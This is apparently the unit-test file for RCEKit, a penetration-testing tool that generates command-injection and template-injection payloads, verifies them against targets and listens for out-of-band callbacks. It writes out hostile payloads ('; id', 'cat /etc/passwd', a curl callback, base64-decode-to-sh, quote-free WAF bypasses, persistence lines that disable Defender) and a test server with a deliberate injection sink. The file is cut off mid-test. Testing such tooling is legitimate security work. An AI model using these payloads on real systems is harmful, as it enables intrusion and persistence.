"""Unit tests for RCEKit.

Run with: python -m unittest discover -s tests  (no third-party deps required)

These tests lock in the properties that matter to the real consumer of this
tool: every emitted payload should be unique and executable/decodable, the
removed obfuscation transforms must stay removed, and the safety filters and
detection mode must behave as documented.
"""

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import rcekit  # noqa: E402
from rcekit import OOBListener, PayloadRecord, RCEKit  # noqa: E402


def make_record(**overrides):
    """A minimal PayloadRecord for exercising the verification oracle."""
    base = dict(
        payload="; id", mode="exploit", category="basic_enum", environment="unix",
        context="raw", encoding="none", sink=None, indicator="", safety="intrusive",
        expected_channel="response", runner="sh",
    )
    base.update(overrides)
    return PayloadRecord(**base)

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPT = REPO_ROOT / "rcekit.py"


class VersionTestCase(unittest.TestCase):
    def test_version_is_semver(self):
        self.assertRegex(rcekit.__version__, r"^\d+\.\d+\.\d+$")


class CLITestCase(unittest.TestCase):
    """Exercise the real CLI (argparse + main) via subprocess, not just the API."""

    def _run(self, *args, cwd=None):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(cwd or REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_help(self):
        result = self._run("--help")
        self.assertEqual(result.returncode, 0)
        self.assertIn("--verify-url", result.stdout)
        self.assertIn("--listen", result.stdout)

    def test_version_flag(self):
        result = self._run("--version")
        self.assertEqual(result.returncode, 0)
        self.assertRegex(result.stdout.strip(), r"\d+\.\d+\.\d+$")

    def test_exploit_requires_consent(self):
        result = self._run("--categories", "basic_enum", "--environments", "unix")
        self.assertIn("consent", (result.stdout + result.stderr).lower())

    def test_detection_only_writes_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.txt"
            result = self._run("--detection-only", "--environments", "unix", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            self.assertTrue(out.exists() and out.read_text().strip())

    def test_jsonl_records_are_valid(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.jsonl"
            self._run("--detection-only", "--environments", "unix",
                      "--output-format", "jsonl", "-o", str(out))
            lines = [l for l in out.read_text().splitlines() if l.strip()]
            self.assertTrue(lines)
            for line in lines:
                json.loads(line)  # each record must be valid JSON

    def test_nuclei_export_produces_templates(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            result = self._run("--detection-only", "--environments", "unix",
                                "--output-format", "nuclei", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            self.assertTrue(list((Path(tmp) / "run_nuclei").glob("*.yaml")))

    def test_target_profile_end_to_end(self):
        profile = REPO_ROOT / "profiles" / "quote-filtered-unix.json"
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "p.txt"
            result = self._run("--acknowledge-consent", "--target-profile", str(profile),
                               "--encodings", "none", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            text = out.read_text()
            self.assertTrue(text.strip())
            self.assertNotIn('"', text)  # profile denies quote characters


class OOBListenerTestCase(unittest.TestCase):
    def setUp(self):
        self.tokens = {"abc123token": {"payload": "; curl http://abc123token.oob.test/",
                                       "category": "oob", "context": "raw"}}
        self.listener = OOBListener(tokens=self.tokens)

    def test_correlates_token_from_host(self):
        hit = self.listener.record("http", "10.0.0.5", "abc123token.oob.test", "/")
        self.assertEqual(hit["token"], "abc123token")
        self.assertEqual(hit["payload"], "; curl http://abc123token.oob.test/")

    def test_correlates_token_from_path_exfil(self):
        hit = self.listener.record("http", "10.0.0.5", "", "/abc123token")
        self.assertEqual(hit["token"], "abc123token")

    def test_unknown_token_reported_without_payload(self):
        hit = self.listener.record("dns", "10.0.0.5", "unknownlabel.oob.test", "")
        self.assertIsNone(hit["payload"])
        self.assertEqual(hit["token"], "unknownlabel")

    def test_dns_query_is_parsed_and_answered(self):
        def encode(name):
            return b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
        query = b"\x12\x34" + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3 + encode("abc123token.oob.test") + b"\x00\x01\x00\x01"
        self.assertEqual(self.listener._parse_dns_qname(query), "abc123token.oob.test")
        response = self.listener._dns_response(query)
        self.assertEqual(response[:2], query[:2])       # same transaction id
        self.assertEqual(response[6:8], b"\x00\x01")     # one answer

    def test_live_http_callback_is_recorded(self):
        import urllib.request
        server = self.listener.start_http(0)
        try:
            port = server.server_address[1]
            req = urllib.request.Request(f"http://127.0.0.1:{port}/",
                                         headers={"Host": "abc123token.oob.test"})
            urllib.request.urlopen(req, timeout=3).read()
            import time
            time.sleep(0.1)
            self.assertTrue(any(h["payload"] for h in self.listener.hits))
        finally:
            server.shutdown()
            server.server_close()


class GeneratorTestCase(unittest.TestCase):
    def setUp(self):
        self.gen = RCEKit()

    def test_templates_loaded(self):
        self.assertTrue(self.gen.payload_categories, "payload categories should load")
        self.assertIn("basic_enum", self.gen.payload_categories)
        self.assertTrue(self.gen.detection_payloads, "detection payloads should load")

    def test_removed_encodings_are_gone(self):
        removed = {"rot13", "rot13_then_base64", "insert_special_chars",
                   "xor_polymorphic", "chunk_shuffle"}
        self.assertEqual(removed & set(self.gen.encoding_methods), set())

    def test_no_garbage_or_non_executable_markers(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"],
            selected_environments=["unix", "windows"],
        ))
        self.assertTrue(records)
        for rec in records:
            self.assertNotIn("XOR(", rec.payload)
            self.assertNotIn("shuffle::", rec.payload)

    def test_payloads_are_unique(self):
        payloads = [r.payload for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations"],
            selected_environments=["unix"],
        )]
        self.assertEqual(len(payloads), len(set(payloads)), "no duplicate payloads")

    def test_random_case_only_for_case_insensitive_runners(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_encodings=["random_case"],
        ) if r.encoding == "random_case"]
        self.assertTrue(records, "random_case should still apply somewhere")
        for rec in records:
            self.assertIn(rec.runner, self.gen.case_insensitive_runners)

    def test_encoding_compatibility_rules(self):
        self.assertFalse(self.gen._encoding_is_compatible("random_case", "sh"))
        self.assertFalse(self.gen._encoding_is_compatible("random_case", "python"))
        self.assertTrue(self.gen._encoding_is_compatible("random_case", "cmd"))
        self.assertTrue(self.gen._encoding_is_compatible("base64", "python"))
        # The self-contained decode-and-run harness is shell-only.
        self.assertTrue(self.gen._encoding_is_compatible("base64_decode_exec", "sh"))
        self.assertFalse(self.gen._encoding_is_compatible("base64_decode_exec", "python"))

    def test_default_encodings_exclude_decoder_required_blobs(self):
        encodings = {r.encoding for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"],
        )}
        # Bare base64/hex blobs must not appear by default (they do nothing
        # unless the sink decodes them).
        self.assertFalse(encodings & self.gen.decoder_required_encodings)

    def test_base64_decode_exec_is_self_contained_and_runnable(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["base64_decode_exec"],
        )]
        self.assertTrue(records)
        for record in records:
            # Carries its own decoder pipeline, so it runs as-is on a shell.
            self.assertIn("|base64 -d|sh", record.payload)

    def test_decoder_required_encodings_are_opt_in(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["base64"],
        )]
        self.assertTrue(records)
        self.assertTrue(all(r.encoding == "base64" for r in records))

    def test_detection_mode_is_safe(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", max_safety="safe",
        ))
        self.assertTrue(records)
        for rec in records:
            self.assertEqual(rec.mode, "detection")
            self.assertEqual(rec.safety, "safe")

    def test_max_safety_excludes_higher_tiers(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["persistence"],
            selected_environments=["unix"],
            max_safety="safe",
        ))
        self.assertEqual(records, [], "persistence is stateful and must be filtered at safe tier")

    def test_sleep_family_is_classified_blocking(self):
        blocking = ["sleep 5", "time.sleep(2)", "Thread.sleep(2000)",
                    "time.Sleep(1 * time.Second)", "pg_sleep(1)", "SELECT pg_sleep(1);",
                    "Start-Sleep -Seconds 3", "select(undef, undef, undef, 1)", "timeout /T 5"]
        for payload in blocking:
            self.assertTrue(self.gen._is_blocking(payload), payload)
        for payload in ["id", "cat /etc/passwd", "setTimeout(()=>x,1000)", "whoami"]:
            self.assertFalse(self.gen._is_blocking(payload), payload)

    def test_blocking_excluded_by_default(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", include_blocking=False, max_safety="stateful",
        ))
        self.assertTrue(all(not r.blocking for r in records))

    def test_watermark_embedded_when_token_present(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"],
            selected_environments=["unix"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
            watermark_token="TESTTOKN",
        ))
        self.assertTrue(records)
        self.assertTrue(any("TESTTOKN" in r.payload for r in records))

    def test_no_watermark_by_default(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "code_execution"],
            selected_environments=["unix", "python"],
        ))
        self.assertTrue(records)
        self.assertFalse(any("RCEKit-ID" in r.payload for r in records))

    def test_code_payloads_not_quote_wrapped(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"],
            selected_environments=["python"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        payloads = [r.payload for r in records]
        # The raw snippet must appear executable, never wrapped into an inert
        # string literal such as "os.system('whoami')".
        self.assertIn("os.system('whoami')", payloads)
        self.assertNotIn('"os.system(\'whoami\')"', payloads)

    def test_ssti_delimiters_preserved(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"],
            selected_environments=["python", "java"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        payloads = [r.payload for r in records]
        # SSTI payloads must keep their template delimiters intact.
        self.assertIn("{{7*7}}", payloads)
        self.assertTrue(any(p.startswith("${") for p in payloads))

    def test_waf_bypass_payloads_are_quote_free(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["waf_bypass"],
            selected_environments=["unix"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        self.assertTrue(records)
        self.assertTrue(any("${IFS}" in r.payload for r in records))
        # The whole point is command injection without quote characters.
        for record in records:
            self.assertNotIn('"', record.payload)
            self.assertNotIn("'", record.payload)

    def test_oob_requires_domain_and_gets_unique_tokens(self):
        # Without an OOB domain, {oob} payloads are dropped entirely.
        without = list(self.gen.generate_payload_records(
            selected_categories=["oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        self.assertEqual(without, [])

        # With a domain, each record carries a unique correlation token/host.
        with_dom = list(self.gen.generate_payload_records(
            selected_categories=["oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            oob_domain="oast.example.com",
        ))
        self.assertTrue(with_dom)
        tokens = [r.token for r in with_dom]
        self.assertTrue(all(tokens), "every OOB record must carry a token")
        self.assertEqual(len(tokens), len(set(tokens)), "OOB tokens must be unique")
        for record in with_dom:
            self.assertIn(record.oob_host, record.payload)
            self.assertTrue(record.oob_host.endswith(".oast.example.com"))
            self.assertEqual(record.expected_channel, "interactsh")

    def test_command_payloads_carry_match_signatures(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations"],
            selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        by_payload = {r.payload: r.match for r in records}
        # `id` output is a recognisable uid= line; /etc/passwd starts with root:.
        self.assertEqual(by_payload.get("; id"), r"uid=\d+")
        self.assertTrue(any(m and "root:" in m for m in by_payload.values()))
        # A signature must actually match real output.
        self.assertRegex("uid=0(root) gid=0(root)", by_payload["; id"])

    def test_canary_match_is_the_token_and_oob_has_none(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"], oob_domain="x.oast.pro",
            max_safety="stateful", include_blocking=True,
        ))
        canaries = [r for r in records if r.token and r.expected_channel in {"response", "stderr"}]
        self.assertTrue(canaries)
        for record in canaries:
            self.assertEqual(record.match, record.token)
        oob = [r for r in records if r.expected_channel == "interactsh"]
        self.assertTrue(oob)
        self.assertTrue(all(r.match is None for r in oob))

    def test_destructive_flagging(self):
        self.assertTrue(self.gen._is_destructive("echo x >> ~/.bashrc", "persistence"))
        self.assertTrue(self.gen._is_destructive("rm -rf /tmp/x", "file_operations"))
        self.assertTrue(self.gen._is_destructive("Set-MpPreference -DisableRealtimeMonitoring $true", "persistence"))
        self.assertFalse(self.gen._is_destructive("id", "basic_enum"))
        self.assertFalse(self.gen._is_destructive("cat /etc/passwd", "file_operations"))
        # The record field is populated from the payload/category.
        records = list(self.gen.generate_payload_records(
            selected_categories=["persistence"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"], max_safety="stateful",
        ))
        self.assertTrue(records)
        self.assertTrue(all(r.destructive for r in records))

    def test_mongodb_and_graphql_sinks_present(self):
        mongo = [r for r in self.gen.generate_payload_records(
            selected_categories=["nosql_injection"], selected_environments=["mongodb"],
            selected_contexts=["raw"], selected_encodings=["none"],
        )]
        self.assertTrue(mongo)
        self.assertTrue(all(r.environment == "mongodb" for r in mongo))
        self.assertTrue(any("$where" in r.payload for r in mongo))
        self.assertTrue(any("$function" in r.payload for r in mongo))

        gql = [r for r in self.gen.generate_payload_records(
            selected_categories=["graphql_injection"], selected_environments=["graphql"],
            selected_contexts=["raw"], selected_encodings=["none"],
        )]
        self.assertTrue(gql)
        self.assertTrue(any("__schema" in r.payload for r in gql))
        # GraphQL / Mongo payloads must not be prefixed with shell separators.
        self.assertTrue(all(not r.payload.startswith((";", "|", "&")) for r in mongo + gql))

    def test_java_expression_sinks_added(self):
        sinks = {
            r.sink for r in self.gen.generate_payload_records(
                selected_categories=["code_execution"], selected_environments=["java"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
        }
        self.assertTrue({"spel", "ognl", "groovy"}.issubset(sinks))

    def test_json_context_escapes_payload(self):
        # A Java payload uses double quotes, which must be escaped to stay a
        # valid JSON string value.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["java"],
            selected_contexts=["json"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        for record in records:
            # Each payload must parse as the body of a JSON string.
            json.loads('"' + record.payload + '"')
        self.assertTrue(any('\\"' in r.payload for r in records))

    def test_xml_context_entity_escapes(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["java"],
            selected_contexts=["xml"], selected_encodings=["none"],
        ))
        self.assertTrue(any("&quot;" in r.payload for r in records))
        self.assertFalse(any('"' in r.payload for r in records))

    def test_transport_context_carries_any_environment(self):
        # A serialization context is compatible with a non-shell environment.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["python"],
            selected_contexts=["yaml"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        self.assertTrue(all(r.context == "yaml" for r in records))

    def test_shell_quoted_context_breaks_out_cleanly(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["shell_single_quoted"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        for record in records:
            self.assertTrue(record.payload.startswith("'; "))
            self.assertNotRegex(record.payload, r";\s*;")  # no ";;" syntax error
        # Shell-quoted contexts are not offered to non-shell environments.
        self.assertFalse(self.gen._is_context_compatible("shell_single_quoted", "python", True))

    def test_default_contexts_exclude_transport_contexts(self):
        # A default run (no --contexts) must not silently include the richer
        # opt-in contexts, keeping output size and behaviour stable.
        contexts = {r.context for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
        )}
        self.assertNotIn("json", contexts)
        self.assertNotIn("shell_single_quoted", contexts)

    def test_sink_needs_separator_keeps_only_breakouts(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        filtered = list(self.gen._filter_by_profile(records, needs_separator=True))
        self.assertTrue(filtered)
        self.assertLess(len(filtered), len(records))
        # The bare command (no separator) can't fire mid-command; it must be gone.
        self.assertIn("id", [r.payload for r in records])
        self.assertNotIn("id", [r.payload for r in filtered])
        # A separator-led variant must survive.
        self.assertIn("; id", [r.payload for r in filtered])

    def test_sink_needs_separator_judges_encoded_payloads_by_canonical_form(self):
        # Separator-validity must be decided on the pre-encoding payload, not the
        # final string: a url-encoded bare command still can't fire mid-command,
        # while a url-encoded break-out still can.
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none", "url_encode"],
        ))
        filtered = list(self.gen._filter_by_profile(records, needs_separator=True))
        # Encoded bare command (decodes to plain "id") cannot break out -> dropped.
        self.assertIn("id", [r.payload for r in records])
        self.assertNotIn("id", [r.payload for r in filtered])
        # Encoded break-out (";" percent-escaped) is still a valid separator once
        # the sink decodes it, so it must survive even though its literal form no
        # longer starts with a separator.
        self.assertIn("%3B%20id", [r.payload for r in records])
        self.assertIn("%3B%20id", [r.payload for r in filtered])
        # Nothing that survives should be an encoded bare command.
        for record in filtered:
            self.assertTrue(record.separator_led)

    def test_sink_blind_keeps_only_out_of_band_confirmable(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            oob_domain="x.oast.pro", max_safety="stateful", include_blocking=True,
        ))
        filtered = list(self.gen._filter_by_profile(records, blind=True))
        self.assertTrue(filtered)
        for record in filtered:
            self.assertTrue(record.blocking or record.oob_host or record.expected_channel == "interactsh")
        # Plain reflected `echo`/`id` payloads (response-only) must be dropped.
        self.assertFalse(any(r.payload == "; id" for r in filtered))

    def test_profile_filter_drops_denied_chars_and_long_payloads(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations", "waf_bypass"],
            selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        filtered = list(self.gen._filter_by_profile(records, deny_chars="'\"", max_length=40))
        self.assertTrue(filtered)
        self.assertLess(len(filtered), len(records), "the filter must actually drop something")
        for record in filtered:
            self.assertNotIn('"', record.payload)
            self.assertNotIn("'", record.payload)
            self.assertLessEqual(len(record.payload), 40)
        # A quote-free WAF-bypass payload should survive the quote filter.
        self.assertTrue(any("${IFS}" in r.payload for r in filtered))

    def test_target_profile_file_applies_end_to_end(self):
        profile = Path(__file__).resolve().parent.parent / "profiles" / "quote-filtered-unix.json"
        self.assertTrue(profile.exists(), "example profile should ship with the repo")
        import json
        spec = json.loads(profile.read_text())
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "p.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out),
                deny_chars="".join(spec["deny_chars"]),
                max_length=spec["max_length"],
                selected_environments=spec["environments"],
                selected_contexts=spec["contexts"],
                selected_categories=spec["categories"],
                selected_encodings=spec["encodings"],
                oob_domain=spec.get("oob_domain"),
            )
            lines = out.read_text().splitlines()
            self.assertTrue(lines)
            for line in lines:
                self.assertNotIn('"', line)
                self.assertNotIn("'", line)
                self.assertLessEqual(len(line), spec["max_length"])

    def test_burp_export_writes_context_wordlists(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp",
                selected_categories=["basic_enum"], selected_environments=["unix"],
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_burp"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertTrue(any(outdir.glob("payloads-*.txt")))
            # Without a target profile Burp users set positions themselves, so no
            # generic placeholder request is fabricated.
            self.assertFalse((outdir / "request.txt").exists())

    def test_wordlist_export_honours_selected_encodings(self):
        # The exporter must not silently drop encoded variants: an encoding the
        # tools cannot reproduce (or simply one the user asked for) belongs in the
        # wordlist as a literal line.
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none", "base64_decode_exec"],
            )
            allp = (Path(tmp) / "run_burp" / "payloads-all.txt").read_text()
            self.assertIn("; id", allp)
            self.assertTrue(any("base64 -d" in line for line in allp.splitlines()),
                            "self-contained encoded variants must survive into the wordlist")

    def test_ffuf_export_with_profile_is_runnable(self):
        request = {"url": "https://target.example/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            req = (outdir / "request.txt").read_text()
            # A real FUZZ marker, not Burp's section sign.
            self.assertIn('{"host": "FUZZ"}', req)
            self.assertNotIn("\xa7", req)
            run = (outdir / "run.sh").read_text()
            self.assertIn("ffuf -request request.txt -w payloads-all.txt", run)
            self.assertIn("-request-proto https", run)

    def test_ffuf_export_without_profile_writes_wordlists_only(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            # No injection point -> no fabricated request or runner.
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_ffuf_export_path_only_profile_is_not_runnable(self):
        # A path-only URL cannot name the target host, so ffuf has nothing to run
        # against -> wordlists only, no misleading request.txt/run.sh pointing at
        # a placeholder host.
        request = {"url": "/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["json"], selected_encodings=["none"],
            )
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_ffuf_export_clears_stale_request_artifacts(self):
        # A profile-backed run followed by a wordlist-only run on the same output
        # directory must not leave the old request.txt/run.sh behind, or an
        # operator could fire a stale runner at the previous target.
        abs_request = {"url": "https://target.example/api/v1/lookup", "method": "POST",
                       "headers": {"Content-Type": "application/json"},
                       "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            outdir = Path(tmp) / "run_ffuf"
            # First run: concrete host -> request.txt + run.sh created.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=abs_request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["json"], selected_encodings=["none"],
            )
            self.assertTrue((outdir / "request.txt").exists())
            self.assertTrue((outdir / "run.sh").exists())
            # Second run on the same dir with no profile -> stale runner is gone.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_export_is_profile_request_aware(self):
        request = {"url": "/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            # Burp request.txt reflects the profile's method/path/body.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            burp_req = (Path(tmp) / "run_burp" / "request.txt").read_text()
            self.assertIn("POST /api/v1/lookup HTTP/1.1", burp_req)
            self.assertIn("Content-Type: application/json", burp_req)
            self.assertIn('{"host": "\xa7payload\xa7"}', burp_req)

            # Nuclei templates embed the same request with the payload marker.
            out2 = Path(tmp) / "run2.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out2), output_format="nuclei", request_template=request,
                selected_environments=["unix"], mode="detection",
                max_safety="stateful", include_blocking=True,
            )
            templates = "\n".join(t.read_text() for t in (Path(tmp) / "run2_nuclei").glob("*.yaml"))
            self.assertIn("POST /api/v1/lookup HTTP/1.1", templates)
            self.assertIn('{"host": "{{payload}}"}', templates)

    def test_nuclei_export_writes_valid_templates(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="nuclei",
                selected_environments=["unix"], mode="detection",
                oob_domain="x.oast.pro", max_safety="stateful", include_blocking=True,
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_nuclei"
            templates = list(outdir.glob("*.yaml"))
            self.assertTrue(templates)
            joined = "\n".join(t.read_text() for t in templates)
            # OOB templates must use the interactsh placeholder, not a real host.
            self.assertIn("{{interactsh-url}}", joined)
            self.assertIn("interactsh_protocol", joined)
            # Time templates normalise sleeps and never include hanging tails.
            time_files = list(outdir.glob("*-time.yaml"))
            if time_files:
                time_text = "\n".join(t.read_text() for t in time_files)
                self.assertIn("duration>=6", time_text)
                self.assertNotIn("tail -f", time_text)


    def test_verify_confirms_execution_against_local_target(self):
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                q = up.parse_qs(up.urlparse(self.path).query)
                host = q.get("host", [""])[0]
                pipe = os.popen("echo " + host + " 2>&1")  # command injection sink
                out = pipe.read()
                pipe.close()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ",
            )
            confirmed = [r for r in results if r["verdict"] == "confirmed"]
            self.assertTrue(confirmed, "the harness must confirm at least one RCE")
            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
        finally:
            server.shutdown()
            server.server_close()

    def test_timing_oracle_requires_a_reproducible_delay(self):
        # A blocking/timing payload is only "confirmed" when the delay clears the
        # noise margin AND reproduces on the re-fire; a one-off spike is jitter.
        rec = make_record(payload="; sleep 8", expected_channel="timing", blocking=True)
        confirmed, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=8.4, baseline=1.0, margin=2.0, elapsed_confirm=8.1)
        self.assertEqual(confirmed, "confirmed")
        # First request was slow but the delay did not reproduce -> not execution.
        jitter, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=8.4, baseline=1.0, margin=2.0, elapsed_confirm=1.2)
        self.assertEqual(jitter, "no-delay")
        # Below the margin at all -> not a delay.
        quick, _ = self.gen._evaluate_verify(
            rec, 200, "", elapsed=1.5, baseline=1.0, margin=2.0, elapsed_confirm=None)
        self.assertEqual(quick, "no-delay")

    def test_reflection_oracle_rejects_signature_present_without_payload(self):
        # The command-output signature confirms execution only when it is absent
        # from the payload-free control response.
        rec = make_record(payload="; id", match=r"uid=\d+", expected_channel="response")
        confirmed, _ = self.gen._evaluate_verify(
            rec, 200, "uid=0(root) gid=0(root)", elapsed=0.1, baseline=0.1,
            control_body="welcome home")
        self.assertEqual(confirmed, "confirmed")
        # Same signature already in the baseline response -> not proof of execution.
        inconclusive, _ = self.gen._evaluate_verify(
            rec, 200, "uid=0(root) gid=0(root)", elapsed=0.1, baseline=0.1,
            control_body="debug: uid=0(root) always shown")
        self.assertEqual(inconclusive, "inconclusive")

    def test_verify_marks_always_reflected_signature_inconclusive(self):
        # End-to-end: a target that echoes the signature regardless of input must
        # not be reported as a confirmed RCE.
        import http.server
        import socketserver
        import threading

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                self.send_response(200)
                self.end_headers()
                # Signature present for every request, payload or not.
                self.wfile.write(b"uid=0(root) gid=0(root) groups=0(root)")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            records = self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            results = self.gen.run_verification(
                records, url=f"http://127.0.0.1:{port}/lookup?host=FUZZ",
            )
            id_results = [r for r in results if r["payload"] == "; id"]
            self.assertTrue(id_results)
            self.assertEqual(id_results[0]["verdict"], "inconclusive")
            self.assertFalse(any(r["verdict"] == "confirmed" for r in results),
